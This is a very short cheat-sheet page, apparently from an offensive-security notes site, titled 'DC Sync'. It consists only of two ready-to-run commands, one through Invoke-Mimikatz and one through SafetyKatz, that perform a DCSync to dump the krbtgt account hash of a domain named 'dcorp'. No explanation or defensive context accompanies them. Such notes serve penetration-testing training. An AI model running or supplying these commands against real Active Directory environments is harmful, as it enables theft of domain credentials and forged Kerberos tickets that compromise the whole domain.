# DC Sync



{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 

SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
{% endcode %}
